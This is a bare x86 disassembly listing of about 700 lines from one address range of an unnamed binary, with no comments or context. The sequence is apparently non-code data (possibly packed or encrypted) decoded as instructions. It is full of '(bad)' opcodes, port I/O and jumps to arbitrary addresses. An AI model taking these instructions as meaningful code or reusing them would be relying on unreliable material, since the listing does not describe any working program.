  423b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b75:	dec    eax
  423b76:	inc    edi
  423b77:	inc    esi
  423b78:	les    ecx,FWORD PTR [esi-0x13]
  423b7b:	addr16 aam 0x48
  423b7e:	adc    eax,0x8b6fff01
  423b83:	out    0x8b,al
  423b85:	test   eax,0x26e52125
  423b8a:	out    dx,al
  423b8b:	mov    eax,0x1df08d26
  423b90:	mov    cl,BYTE PTR [esi]
  423b92:	or     al,0xae
  423b94:	or     bl,BYTE PTR [edx+0x39]
  423b97:	lods   eax,DWORD PTR ds:[esi]
  423b98:	dec    edi
  423b99:	sub    DWORD PTR [ecx-0xdd64703],edx
  423b9f:	adc    BYTE PTR [edx+0x5c],bl
  423ba2:	mov    DWORD PTR [esi-0x1588e1c6],edi
  423ba8:	int3   
  423ba9:	jbe    0x423ba1
  423bab:	shl    BYTE PTR [edx],1
  423bad:	add    al,0x20
  423baf:	call   0x78b2deee
  423bb4:	outs   dx,DWORD PTR ds:[esi]
  423bb5:	inc    ebx
  423bb6:	je     0x423c29
  423bb8:	addr16 daa 
  423bba:	jg     0x423be7
  423bbc:	adc    eax,0xf99697e5
  423bc1:	cwde   
  423bc2:	gs in  al,0xcc
  423bc5:	inc    esp
  423bc6:	in     al,dx
  423bc7:	mov    ah,0x8c
  423bc9:	add    eax,DWORD PTR [edi]
  423bcb:	inc    esi
  423bcc:	retf   
  423bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bce:	mov    ch,0x48
  423bd0:	mov    al,ds:0x3d0ffa6a
  423bd5:	mov    ah,0x83
  423bd7:	imul   eax,DWORD PTR [esi],0xe8ae5a72
  423bdd:	sbb    al,0x84
  423bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423be0:	(bad)  
  423be1:	and    DWORD PTR [esi],ecx
  423be3:	loope  0x423b98
  423be5:	cmp    bl,0x40
  423be8:	push   0xffffffc3
  423bea:	in     eax,dx
  423beb:	or     eax,0x8ba6ba92
  423bf0:	lods   eax,DWORD PTR ds:[esi]
  423bf1:	test   DWORD PTR [ebx+0x20],0x16fceb4b
  423bf8:	or     DWORD PTR [edi],0xffffffda
  423bfb:	fsubr  DWORD PTR [edi]
  423bfd:	shl    ebp,0x1a
  423c00:	(bad)  
  423c01:	hlt    
  423c02:	fisttp WORD PTR [ecx+esi*4+0x496d89bb]
  423c09:	lds    eax,FWORD PTR [edi-0x5a]
  423c0c:	cmp    bl,BYTE PTR [ebp+0x590e0b1d]
  423c12:	lahf   
  423c13:	ret    0x7152
  423c16:	inc    ebx
  423c17:	ror    DWORD PTR [edx],0xf4
  423c1a:	or     eax,0xdd4d1f64
  423c1f:	ins    BYTE PTR es:[edi],dx
  423c20:	push   ss
  423c21:	xchg   esi,eax
  423c22:	dec    edx
  423c23:	hlt    
  423c24:	mov    al,ds:0xff5efaa2
  423c29:	push   ss
  423c2a:	adc    eax,0x52e1430b
  423c2f:	clc    
  423c30:	popa   
  423c31:	(bad)  
  423c33:	out    0x90,eax
  423c35:	or     dh,BYTE PTR [edx]
  423c37:	and    eax,0x49e98b19
  423c3c:	dec    esi
  423c3d:	push   esi
  423c3e:	mov    cl,0xfc
  423c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c41:	in     eax,0x18
  423c43:	(bad)  
  423c44:	arpl   WORD PTR [eax-0x3083a86f],ax
  423c4a:	and    DWORD PTR [edi+0x21],0xa5008314
  423c51:	cmp    eax,0x7b2a4c26
  423c56:	mov    ds:0xc4d98312,eax
  423c5b:	imul   ebp,DWORD PTR [edi-0x39],0xc5d6932b
  423c62:	ins    BYTE PTR es:[edi],dx
  423c63:	ret    0xbd05
  423c66:	sbb    ebx,DWORD PTR [edx+0x64]
  423c69:	jg     0x423cca
  423c6b:	jae    0x423c39
  423c6d:	or     eax,0x16fc0d3c
  423c72:	mov    ecx,0xfc9b7c78
  423c77:	sbb    al,0x2f
  423c79:	jne    0x423cc5
  423c7b:	jge    0x423cb9
  423c7d:	add    esi,DWORD PTR [eax+0xfd1b76c]
  423c83:	adc    eax,0x776a9ddc
  423c88:	aad    0x89
  423c8a:	out    dx,al
  423c8b:	or     eax,0x660cefbf
  423c90:	(bad)  
  423c91:	lods   eax,DWORD PTR ds:[esi]
  423c92:	test   al,0x47
  423c94:	cmp    DWORD PTR [ebx],esi
  423c96:	adc    al,0x1b
  423c98:	and    al,0xb7
  423c9a:	inc    ebp
  423c9b:	pop    ds
  423c9c:	out    0x56,al
  423c9e:	loop   0x423cab
  423ca0:	cmc    
  423ca1:	and    eax,0x1b3d952f
  423ca6:	jno    0x423cf2
  423ca8:	and    DWORD PTR [ebp+esi*8-0x5129130b],ecx
  423caf:	inc    ebp
  423cb0:	sub    DWORD PTR [ebx],edi
  423cb2:	call   0xf002:0x21203435
  423cb9:	loope  0x423cb6
  423cbb:	arpl   WORD PTR [ecx+eiz*4-0xd],ax
  423cbf:	gs pop edi
  423cc1:	lock push ds
  423cc3:	sub    BYTE PTR [edx+0x39e513d5],bl
  423cc9:	and    al,ah
  423ccb:	sbb    ecx,DWORD PTR [edx+eax*2+0x49]
  423ccf:	mov    BYTE PTR [esi+0x2246eead],bl
  423cd5:	jnp    0x423c68
  423cd7:	xor    BYTE PTR [esi+0x6351e952],al
  423cdd:	cmp    ah,BYTE PTR [edi+0x30]
  423ce0:	pop    ebx
  423ce1:	sub    dl,BYTE PTR [eax+0x2a]
  423ce4:	xchg   edx,eax
  423ce5:	inc    esi
  423ce6:	sbb    DWORD PTR [ecx+ebp*8-0x25941d1b],edx
  423ced:	(bad)
  423cf0:	jmp    0xd1121c20
  423cf5:	cmp    al,bh
  423cf7:	pop    eax
  423cf8:	lods   al,BYTE PTR ds:[esi]
  423cf9:	and    DWORD PTR [edi-0x5e18e7a5],0x5a
  423d00:	jmp    0x7d83bf58
  423d05:	js     0x423ca8
  423d07:	pop    ecx
  423d08:	jne    0x423d70
  423d0a:	cmp    BYTE PTR [esi+edx*8+0x7bf4524b],al
  423d11:	mov    esi,0x9f07b884
  423d16:	mov    bh,0xb7
  423d18:	js     0x423d8b
  423d1a:	mov    al,0x85
  423d1c:	in     eax,0xaf
  423d1e:	cmp    BYTE PTR [ebx+0x3f],dl
  423d21:	dec    esi
  423d22:	sub    eax,0x6a2588b2
  423d27:	ror    BYTE PTR [ebx],0x88
  423d2a:	(bad)  
  423d2b:	xor    eax,0xa2369045
  423d30:	mov    ch,0x1e
  423d32:	pop    eax
  423d33:	cwde   
  423d34:	inc    edx
  423d35:	push   ecx
  423d36:	dec    edx
  423d37:	and    eax,DWORD PTR [ecx+0x1b]
  423d3a:	mov    ds:0xdcb23c56,al
  423d3f:	es ja  0x423cf3
  423d42:	js     0x423d0b
  423d44:	sbb    al,0xb1
  423d46:	in     al,0xd2
  423d48:	pop    ecx
  423d49:	jge    0x423d54
  423d4b:	adc    dl,BYTE PTR [ecx]
  423d4d:	mov    cx,0x5a2b
  423d51:	retf   0xf04a
  423d54:	inc    ebx
  423d55:	mov    edi,0xa26fccd1
  423d5a:	and    bl,BYTE PTR ds:0x93440dba
  423d60:	loop   0x423d8f
  423d62:	js     0x423cf8
  423d64:	fidivr DWORD PTR [ebp+0x678197d3]
  423d6a:	rol    DWORD PTR [esi+0x39],cl
  423d6d:	or     ecx,DWORD PTR [ebp+esi*4-0x19]
  423d71:	das    
  423d72:	or     eax,0x47fac2ee
  423d77:	add    eax,0xef9402bf
  423d7c:	outs   dx,BYTE PTR ds:[esi]
  423d7d:	imul   edi,DWORD PTR [edi],0x50cf3c11
  423d83:	lds    ebx,FWORD PTR [ecx+0x1b]
  423d86:	mov    eax,0xc9e68f48
  423d8b:	sub    al,ch
  423d8d:	mov    BYTE PTR [edx],ch
  423d8f:	js     0x423df8
  423d91:	mov    ah,0xb
  423d93:	fst    DWORD PTR ds:0x4f9c
  423d98:	loop   0x423e03
  423d9a:	dec    eax
  423d9b:	and    BYTE PTR [edx+0x5b4706fc],bl
  423da1:	jecxz  0x423df7
  423da3:	inc    esp
  423da4:	pop    eax
  423da5:	jecxz  0x423e0e
  423da7:	arpl   WORD PTR [edi-0xa],sp
  423daa:	inc    esi
  423dab:	pop    ds
  423dac:	pop    ds
  423dad:	pop    eax
  423dae:	jg     0x423d7c
  423db0:	sub    esp,DWORD PTR [eax+0x43]
  423db3:	rcr    ebx,1
  423db5:	add    dh,BYTE PTR [ebp+edx*4+0x5ba4d495]
  423dbc:	sbb    DWORD PTR [esi+0x54],ebx
  423dbf:	sbb    edi,DWORD PTR cs:[eax-0x8]
  423dc3:	mov    bh,0xdb
  423dc5:	xor    DWORD PTR [ebx+edi*4-0x4f],ecx
  423dc9:	sbb    BYTE PTR [ebx],0xb5
  423dcc:	std    
  423dcd:	push   ecx
  423dce:	test   al,0xd1
  423dd0:	push   esi
  423dd1:	xor    al,0x99
  423dd3:	push   eax
  423dd4:	sbb    al,0xc6
  423dd6:	push   eax
  423dd7:	or     eax,0x2ab80ae8
  423ddc:	xor    BYTE PTR [edx],0xf1
  423ddf:	scas   al,BYTE PTR es:[edi]
  423de0:	retf   0xd1ba
  423de3:	fstp   DWORD PTR [ebp+edi*2+0x2a0f8f89]
  423dea:	xor    eax,0xd5077264
  423def:	mov    dl,0x17
  423df1:	dec    ebp
  423df2:	in     al,0xbd
  423df4:	or     al,0x20
  423df6:	push   edi
  423df7:	push   edx
  423df8:	(bad)  
  423df9:	loope  0x423dc5
  423dfb:	std    
  423dfc:	loop   0x423e2d
  423dfe:	shl    ebp,cl
  423e00:	rcr    ah,cl
  423e02:	int3   
  423e03:	adc    esp,DWORD PTR [ebp-0x9]
  423e06:	jns    0x423e42
  423e08:	or     BYTE PTR [edx-0x28],dl
  423e0b:	out    dx,al
  423e0c:	jne    0x423e3b
  423e0e:	mov    ch,0xb1
  423e10:	cmp    eax,0xf2fbb10b
  423e15:	push   cs
  423e16:	fild   WORD PTR [eax+ebx*4-0x13]
  423e1a:	call   0x724cb486
  423e1f:	jne    0x423e39
  423e21:	addr16 or edi,ebx
  423e24:	xlat   BYTE PTR ds:[ebx]
  423e25:	(bad)  
  423e26:	dec    esi
  423e27:	mov    esp,0x7c8ef5a0
  423e2c:	rcr    DWORD PTR [eax+0x593cec75],cl
  423e32:	sub    al,0xc5
  423e34:	adc    cl,BYTE PTR [esi-0x26]
  423e37:	into   
  423e38:	jnp    0x423e69
  423e3a:	or     ecx,ecx
  423e3c:	jmp    0xbe223fba
  423e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e42:	aas    
  423e43:	sub    edx,ebp
  423e45:	mov    BYTE PTR [eax],cl
  423e47:	sbb    ah,BYTE PTR [esi+0x10]
  423e4a:	jno    0x423dd7
  423e4c:	pusha  
  423e4d:	stos   BYTE PTR es:[edi],al
  423e4e:	rol    BYTE PTR [ebx+0x524b9c18],0xa3
  423e55:	fcomp  st(6)
  423e57:	pop    ss
  423e58:	or     ebp,edx
  423e5a:	jle    0x423e25
  423e5c:	adc    ebp,0x1c453d4f
  423e62:	pop    esi
  423e63:	dec    eax
  423e64:	and    ah,BYTE PTR [edi-0x554cabf0]
  423e6a:	shl    ebp,cl
  423e6c:	or     ch,BYTE PTR [edx-0x2c66ccab]
  423e72:	pop    es
  423e73:	ins    DWORD PTR es:[edi],dx
  423e74:	mov    esp,0xd9e42f86
  423e79:	lahf   
  423e7a:	test   eax,0x23fa37c9
  423e7f:	add    eax,0xf0cd1ab5
  423e84:	push   cs
  423e85:	lds    edi,FWORD PTR [eax]
  423e87:	iret   
  423e88:	add    BYTE PTR [ebx+0xcf45a60],0x19
  423e8f:	cmp    BYTE PTR [edi+eiz*1-0x6f3a654],dh
  423e96:	addr16 inc ecx
  423e98:	dec    cx
  423e9a:	xor    ch,dh
  423e9c:	sbb    ebx,DWORD PTR [ebp-0x8]
  423e9f:	mov    BYTE PTR [esi],dh
  423ea1:	mov    ds:0x1a41ec04,al
  423ea6:	fs cli 
  423ea8:	int3   
  423ea9:	cld    
  423eaa:	dec    eax
  423eab:	mov    bl,0xc2
  423ead:	push   esp
  423eae:	mov    ds:0x8340f6a6,al
  423eb3:	sbb    ecx,edi
  423eb5:	call   ecx
  423eb7:	pop    ebp
  423eb8:	xor    ebp,DWORD PTR [edi+0x63]
  423ebb:	outs   dx,DWORD PTR ds:[esi]
  423ebc:	mov    ecx,0xd7a16f5c
  423ec1:	inc    edx
  423ec2:	mov    dh,BYTE PTR [edi+0x360f3736]
  423ec8:	outs   dx,DWORD PTR ds:[esi]
  423ec9:	(bad)  
  423eca:	enter  0xd3cd,0xeb
  423ece:	sub    al,0xdd
  423ed0:	sbb    dh,BYTE PTR [ebx]
  423ed2:	cmp    al,0x31
  423ed4:	jb     0x423e79
  423ed6:	adc    DWORD PTR ds:0x788847ac,esp
  423edc:	adc    DWORD PTR [ebx],0x918d48ae
  423ee2:	pop    edi
  423ee3:	xchg   ebx,eax
  423ee4:	mov    bh,0x2a
  423ee6:	inc    ebp
  423ee7:	mov    ss,WORD PTR [edi-0x6b]
  423eea:	mov    WORD PTR [ebp-0x13708163],cs
  423ef0:	std    
  423ef1:	jbe    0x423f30
  423ef3:	nop
  423ef4:	sbb    BYTE PTR [edi+eax*8+0x70],ch
  423ef8:	std    
  423ef9:	(bad)  
  423efa:	cmp    eax,0xd5ee6cae
  423eff:	ins    DWORD PTR es:[edi],dx
  423f00:	rcr    DWORD PTR [edx-0x5d],0x53
  423f04:	fdivr  DWORD PTR ds:0x9dbd3729
  423f0a:	mov    eax,0x63b2b8f6
  423f0f:	retf   
  423f10:	dec    eax
  423f11:	gs ret 
  423f13:	inc    ebp
  423f14:	sbb    DWORD PTR [ecx+0x3150fad1],edi
  423f1a:	mov    edi,0xd008dcae
  423f1f:	sbb    ebp,esi
  423f21:	cmp    eax,0xb7414124
  423f26:	lea    ebx,[ecx-0x41]
  423f29:	fs sub al,0xe3
  423f2c:	hlt    
  423f2d:	sbb    ecx,DWORD PTR [edx+0x25195ad0]
  423f33:	icebp  
  423f34:	push   ds
  423f35:	loop   0x423f0b
  423f37:	mov    cl,0x25
  423f39:	bound  esi,QWORD PTR ds:0x786f3872
  423f3f:	imul   ebp,DWORD PTR [edi+0x394551],0x80df97ad
  423f49:	ins    DWORD PTR es:[edi],dx
  423f4a:	and    edi,DWORD PTR [esi]
  423f4c:	lock sub DWORD PTR [esi],eax
  423f4f:	xchg   BYTE PTR [edi-0xa7ab0d3],al
  423f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f56:	xchg   esi,eax
  423f57:	repz xlat BYTE PTR ds:[ebx]
  423f59:	and    BYTE PTR [ebp-0x30],dl
  423f5c:	mov    edx,DWORD PTR [ebx]
  423f5e:	xor    eax,0x60e3240c
  423f63:	das    
  423f64:	js     0x423f2b
  423f66:	std    
  423f67:	add    al,BYTE PTR [esi-0x22fdc83b]
  423f6d:	inc    ebp
  423f6e:	ss fwait
  423f70:	in     eax,dx
  423f71:	push   0x7f
  423f73:	or     dl,bl
  423f75:	mov    ch,0x20
  423f77:	xchg   BYTE PTR [eax-0x2f],bh
  423f7a:	xor    esi,DWORD PTR [edx+0x56]
  423f7d:	or     eax,DWORD PTR [eax-0x6b]
  423f80:	cmc    
  423f81:	push   esp
  423f82:	out    dx,al
  423f83:	jp     0x423fd5
  423f85:	or     al,0x81
  423f87:	pushw  cs
  423f89:	mov    eax,0xd951d4b4
  423f8e:	and    al,0x1b
  423f90:	sub    bl,BYTE PTR ds:0xe04bb13d
  423f96:	mov    dl,0x82
  423f98:	add    DWORD PTR [edx],ebp
  423f9a:	mov    eax,0x3b12ba31
  423f9f:	imul   eax,ecx,0x61bed34b
  423fa5:	inc    eax
  423fa6:	(bad)
  423fa9:	dec    eax
  423faa:	push   ds
  423fab:	cmp    DWORD PTR [edx-0x7452600d],esi
  423fb1:	inc    ecx
  423fb2:	in     al,0x77
  423fb4:	enter  0x4dfb,0xba
  423fb8:	ins    BYTE PTR es:[edi],dx
  423fb9:	jbe    0x42402e
  423fbb:	cli    
  423fbc:	ja     0x423fb9
  423fbe:	jecxz  0x424019
  423fc0:	pop    edi
  423fc1:	popf   
  423fc2:	adc    dl,dh
  423fc4:	cmp    eax,0x2bedc5bc
  423fc9:	mov    ds:0x48df3e51,al
  423fce:	scas   eax,DWORD PTR es:[edi]
  423fcf:	mov    dh,0x49
  423fd1:	xchg   DWORD PTR [edx-0x4c],edi
  423fd4:	or     DWORD PTR [ebp-0x16918f88],esp
  423fda:	sbb    esi,DWORD PTR [edi-0x4883be17]
  423fe0:	(bad)  
  423fe2:	iret   
  423fe3:	jge    0x423f95
  423fe5:	fwait
  423fe6:	pushf  
  423fe7:	into   
  423fe8:	or     BYTE PTR [edi-0x12c59086],dh
  423fee:	adc    eax,0xd265c658
  423ff3:	ss jbe 0x424069
  423ff6:	cmp    al,0xec
  423ff8:	lea    edi,[edi+0x71]
  423ffb:	inc    ebx
  423ffc:	icebp  
  423ffd:	xor    esp,DWORD PTR [ebp+0x75]
  424000:	in     eax,dx
  424001:	mov    esi,0x6df6cd9f
  424006:	push   ebx
  424007:	add    al,0x1b
  424009:	xor    BYTE PTR [edi+eiz*4-0x58e04a27],cl
  424010:	out    dx,al
  424011:	xor    eax,0x5a6138d3
  424016:	dec    edi
  424017:	nop
  424018:	sub    eax,0x60b853ac
  42401d:	ins    DWORD PTR es:[edi],dx
  42401e:	mov    dh,0x65
  424020:	add    DWORD PTR [ecx-0xda84c72],ecx
  424026:	push   edx
  424027:	ficom  WORD PTR [ecx-0x3fdb5861]
  42402d:	xlat   BYTE PTR ds:[ebx]
  42402e:	fisttp DWORD PTR [eax+0x511699c1]
  424034:	fcomip st,st(7)
  424036:	push   cs
  424037:	mov    bh,0x8f
  424039:	inc    edx
  42403a:	sar    BYTE PTR ds:0x7dfd2849,cl
  424040:	ror    DWORD PTR [eax-0x2e07a14a],cl
  424046:	dec    ebp
  424047:	mov    ds:0x2769e785,al
  42404c:	push   edx
  42404d:	adc    dh,cl
  42404f:	mov    esp,0xc8427ce7
  424054:	dec    esp
  424055:	cmc    
  424056:	ds gs scas al,BYTE PTR es:[edi]
  424059:	in     al,dx
  42405a:	sub    ah,BYTE PTR [ecx+edx*1-0x3b6c20b]
  424061:	xchg   esp,eax
  424062:	and    DWORD PTR [edi-0xe47122],esi
  424068:	dec    esi
  424069:	sbb    bh,BYTE PTR [ebp-0x7a]
  42406c:	pushf  
  42406d:	xchg   ebx,eax
  42406e:	mov    ecx,DWORD PTR [esp+eiz*4-0x2c]
  424072:	pop    ds
  424073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424074:	jbe    0x42401b
  424076:	fldcw  WORD PTR [edx+0x12]
  424079:	push   ecx
  42407a:	test   DWORD PTR [ecx],ebx
  42407c:	out    dx,al
  42407d:	out    0x40,eax
  42407f:	adc    eax,0xb92089f4
  424084:	stc    
  424085:	sbb    DWORD PTR [ecx],edx
  424087:	loop   0x424066
  424089:	or     ebx,DWORD PTR [esi-0x5a014128]
  42408f:	call   0x83bc:0xc48b7a13
  424096:	mov    ax,WORD PTR [ebx+edx*1+0x4e70cec1]
  42409e:	sbb    ch,BYTE PTR [ebx-0x19016eef]
  4240a4:	(bad)  
  4240a5:	jb     0x4240a6
  4240a7:	scas   al,BYTE PTR es:[edi]
  4240a8:	(bad)  
  4240a9:	iret   
  4240aa:	inc    ebp
  4240ab:	add    eax,edx
  4240ad:	rcr    BYTE PTR [eax],1
  4240af:	push   esi
  4240b0:	scas   eax,DWORD PTR es:[edi]
  4240b1:	jns    0x424113
  4240b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240b4:	or     esi,ebp
  4240b6:	lahf   
  4240b7:	arpl   WORD PTR [ebx+0x6c],di
  4240ba:	mov    dh,0x45
  4240bc:	jns    0x4240f2
  4240be:	outs   dx,DWORD PTR ds:[esi]
  4240bf:	imul   edx,DWORD PTR [ebx+0x1f],0xb9a99c9d
  4240c6:	xchg   ebp,eax
  4240c7:	retf   
  4240c8:	and    al,0x82
  4240ca:	push   0xffffffbb
  4240cc:	test   DWORD PTR [edx+ebp*8+0x270a6707],eax
  4240d3:	sahf   
  4240d4:	and    al,0x94
  4240d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240d7:	add    al,0x64
  4240d9:	stos   BYTE PTR es:[edi],al
  4240da:	xor    edi,DWORD PTR gs:[eax]
  4240dd:	xchg   ecx,eax
  4240de:	pop    esi
  4240df:	and    al,0x97
  4240e1:	cli    
  4240e2:	add    eax,0xb79ae77a
  4240e7:	outs   dx,BYTE PTR ds:[esi]
  4240e8:	fwait
  4240e9:	outs   dx,BYTE PTR ds:[esi]
  4240ea:	aam    0x73
  4240ec:	clc    
  4240ed:	pop    edx
  4240ee:	test   eax,0x16ff3543
  4240f3:	dec    edi
  4240f4:	cld    
  4240f5:	aam    0x72
  4240f7:	fwait
  4240f8:	leave  
  4240f9:	fcmovbe st,st(1)
  4240fb:	mov    dh,0x65
  4240fd:	test   esp,ecx
  4240ff:	ss gs ss or eax,0x3ed97122
  424107:	adc    eax,0x54eb930d
  42410c:	scas   al,BYTE PTR es:[edi]
  42410d:	pop    es
  42410e:	fstp   QWORD PTR [ecx+0x1cff77cd]
  424114:	(bad)  
  424115:	add    al,0xf4
  424117:	(bad)  
  424118:	xchg   edi,eax
  424119:	pushf  
  42411a:	dec    ecx
  42411b:	pop    es
  42411c:	popf   
  42411d:	pushf  
  42411e:	and    BYTE PTR [edi],dl
  424120:	out    dx,eax
  424121:	inc    ebx
  424122:	and    al,0xf0
  424125:	inc    ecx
  424126:	ror    ah,1
  424128:	dec    ebx
  424129:	pop    ss
  42412a:	dec    esi
  42412b:	repnz mov eax,ds:0x6f9126e5
  424131:	jne    0x42411a
  424133:	xchg   ebx,eax
  424134:	cli    
  424135:	lahf   
  424136:	daa    
  424137:	fs int3 
  424139:	gs jno 0x4240c4
  42413c:	cdq    
  42413d:	test   DWORD PTR [edi+esi*2],ecx
  424140:	lahf   
  424141:	or     DWORD PTR ds:0xe5dccc3d,esp
  424147:	jmp    0xa263:0x3d79c5b3
  42414e:	ja     0x42419a
  424150:	nop
  424151:	or     al,0xc4
  424153:	int3   
  424154:	stc    
  424155:	hlt    
  424156:	xchg   esi,eax
  424157:	int    0x30
  424159:	xor    eax,0x6d678011
  42415e:	mov    BYTE PTR [edi+0xb0f1156],dl
  424164:	or     edi,edi
  424166:	test   al,0x57
  424168:	mov    eax,0xf7befd2
  42416d:	stos   DWORD PTR es:[edi],eax
  42416e:	lahf   
  42416f:	ja     0x4241e0
  424171:	sbb    bh,BYTE PTR [ebx]
  424173:	mov    bl,0xf4
  424175:	loope  0x4241dc
  424177:	push   esp
  424178:	sti    
  424179:	push   ebx
  42417a:	push   edi
  42417b:	gs pop esp
  42417d:	test   eax,0x99f736e8
  424182:	cdq    
  424183:	mov    cl,0x58
  424185:	inc    eax
  424186:	lea    eax,[ebx+0x1d]
  424189:	(bad)  
  42418b:	add    DWORD PTR [esp+ecx*8],0x7c7568a3
  424192:	mov    esi,0x7dd91d95
  424197:	adc    DWORD PTR [edi],edx
  424199:	(bad)  
  42419b:	jge    0x42412d
  42419d:	bound  eax,QWORD PTR [esi+0x73]
  4241a0:	outs   dx,BYTE PTR ds:[esi]
  4241a1:	jo     0x4241fb
  4241a3:	push   esi
  4241a4:	xchg   DWORD PTR [edi+edx*4+0x6daa0485],eax
  4241ab:	or     al,0xb2
  4241ad:	clc    
  4241ae:	leave  
  4241af:	adc    al,0x76
  4241b1:	sub    BYTE PTR [ebx+0x6e2a29e],dl
  4241b7:	(bad)  
  4241b8:	dec    esp
  4241b9:	lods   al,BYTE PTR ds:[esi]
  4241ba:	and    BYTE PTR [eax],dl
  4241bc:	imul   ebp,DWORD PTR ds:0xa13db18f,0x1d
  4241c3:	hlt    
  4241c4:	jmp    0x424159
  4241c6:	adc    ah,al
  4241c8:	xchg   DWORD PTR [ebp+0x35],ebx
  4241cb:	ds addr16 pop ss
  4241ce:	pop    esp
  4241cf:	aas    
  4241d0:	jmp    0xaff7e0bf
  4241d5:	enter  0x601f,0x19
  4241d9:	popf   
  4241da:	dec    ebx
  4241db:	adc    BYTE PTR [edx-0x13],dl
  4241de:	scas   al,BYTE PTR es:[edi]
  4241df:	enter  0x1d83,0x82
  4241e3:	imul   ebp,edi,0x77
  4241e6:	imul   ebx,DWORD PTR [eax+edx*4-0x32],0xc7ec0144
  4241ee:	fimul  DWORD PTR [edx]
  4241f0:	jnp    0x424251
  4241f2:	xor    al,0xd6
  4241f4:	sub    al,0x8c
  4241f6:	xchg   ecx,eax
  4241f7:	clc    
  4241f8:	cmp    BYTE PTR [ecx+0x53],0xb4
  4241fc:	aad    0xcb
  4241fe:	inc    ah
  424200:	pop    edi
  424201:	lods   eax,DWORD PTR ds:[esi]
  424202:	inc    edi
  424203:	sbb    DWORD PTR [ecx],ebx
  424205:	pop    es
  424206:	dec    edi
  424207:	cmp    bl,ch
  424209:	and    bl,al
  42420b:	sbb    DWORD PTR [edx-0x1b6d0ae7],esi
  424211:	aad    0x30
  424213:	(bad)  
  424214:	js     0x424219
  424216:	clc    
  424217:	push   esp
  424218:	ins    BYTE PTR es:[edi],dx
  424219:	fwait
  42421a:	ret    0xe3fe
  42421d:	xchg   esi,eax
  42421e:	jo     0x424203
  424220:	hlt    
  424221:	sbb    al,0xc8
  424223:	lds    esi,FWORD PTR [eax+edx*1]
  424226:	cmp    BYTE PTR [ebx],cl
  424228:	cmp    al,0xfb
  42422a:	stos   BYTE PTR es:[edi],al
  42422b:	lahf   
  42422c:	es jle 0x424249
  42422f:	xchg   ecx,eax
  424230:	(bad)  
  424231:	push   ecx
  424232:	mov    ecx,0xd769dcb4
  424237:	or     eax,esi
  424239:	cmp    ebx,esi
  42423b:	or     BYTE PTR [edx],ch
  42423d:	test   eax,0xb71b2f9e
  424242:	add    eax,0x25e34f82
  424247:	scas   al,BYTE PTR es:[edi]
  424248:	mov    esp,esi
  42424a:	jge    0x42427d
  42424c:	cmp    cl,dl
  42424e:	mov    dh,0xe2
  424250:	pushf  
  424251:	jecxz  0x424252
  424253:	sbb    ch,BYTE PTR [edi+0x3f]
  424256:	pop    ss
  424257:	jo     0x4242b8
  424259:	retf   0x398e
  42425c:	and    DWORD PTR [esi],ecx
  42425e:	xchg   esp,eax
  42425f:	cs pop edx
  424261:	sub    eax,0xbfdc0499
  424266:	cmc    
  424267:	cld    
  424268:	(bad)
  42426d:	adc    ebx,DWORD PTR [ebp-0xf]
  424270:	push   0xb0107fbe
  424275:	sbb    al,0x64
  424277:	lods   al,BYTE PTR ds:[esi]
  424278:	cli    
  424279:	jae    0x424205
  42427b:	jno    0x56d3f8a0
  424281:	sbb    eax,0xc1fa5c34
  424286:	cmc    
  424287:	dec    esi
  424288:	xor    al,0xe
  42428a:	dec    esp
  42428b:	test   al,0xdf
  42428d:	cmp    ebx,ecx
  42428f:	hlt    
  424290:	mov    ah,0x83
  424292:	sbb    esi,eax
  424294:	push   0xfc8329c0
  424299:	js     0x4242eb
  42429b:	push   cs
  42429c:	aas    
  42429d:	data16 (bad) 
  42429f:	mov    edi,0x6b1520d6
  4242a4:	xor    dh,ch
  4242a6:	scas   eax,DWORD PTR es:[edi]
  4242a7:	les    esp,FWORD PTR [ebx+0x56]
  4242aa:	or     ch,BYTE PTR [ecx-0x42b82e88]
  4242b0:	iret   
  4242b1:	aaa    
  4242b2:	and    bl,BYTE PTR [edx+0x5452ea19]
  4242b8:	lea    ebp,[edx+ebx*4]
  4242bb:	call   0xb959:0x2765e43e
  4242c2:	(bad)  
  4242c3:	jne    0x42428e
  4242c5:	pop    ecx
  4242c6:	shr    DWORD PTR [ecx+0x1a],0xeb
  4242ca:	mov    ah,0x19
  4242cc:	div    DWORD PTR [ecx+0x616c0fd5]
  4242d2:	jge    0x424339
  4242d4:	cmp    DWORD PTR [eax-0x7a4edf72],esp
  4242da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242db:	adc    BYTE PTR [esi],0x9f
  4242de:	cmp    eax,0x9bdb56d0
  4242e3:	cli    
  4242e4:	hlt    
  4242e5:	loopne 0x424348
  4242e7:	dec    ebx
  4242e8:	test   al,0x98
  4242ea:	je     0x42427c
  4242ec:	xor    eax,DWORD PTR [ecx-0x75]
  4242ef:	mov    esp,DWORD PTR [ebx]
  4242f1:	mov    edi,0xf3b3a1d9
  4242f6:	or     dl,BYTE PTR [eax]
  4242f8:	loop   0x424373
  4242fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242fb:	je     0x4242d5
  4242fd:	xchg   ecx,eax
  4242fe:	sbb    BYTE PTR [eax],bl
  424300:	scas   eax,DWORD PTR es:[edi]
  424301:	(bad)  
  424302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424303:	xor    ah,dh
  424305:	jmp    0x424339
  424307:	jmp    0x43eb5555
  42430c:	sbb    al,0xe0
  42430e:	ss mov ecx,0xa5e0d553
  424314:	and    al,0xa7
  424316:	and    DWORD PTR [edx-0x24a9b297],edi
  42431c:	cmp    eax,0x13acd9e7
  424321:	xchg   BYTE PTR [esi-0x4dfbbdde],al
  424327:	call   0x78d1c8bc
  42432c:	retf   
  42432d:	mov    eax,0x2355cf88
  424332:	(bad)  
  424333:	in     al,0x38
  424335:	or     BYTE PTR ds:0x6ee43bc1,bl
  42433b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42433c:	and    DWORD PTR [ecx+0x582faea9],esp
  424342:	dec    ebx
  424343:	clc    
  424344:	pop    ecx
  424345:	aaa    
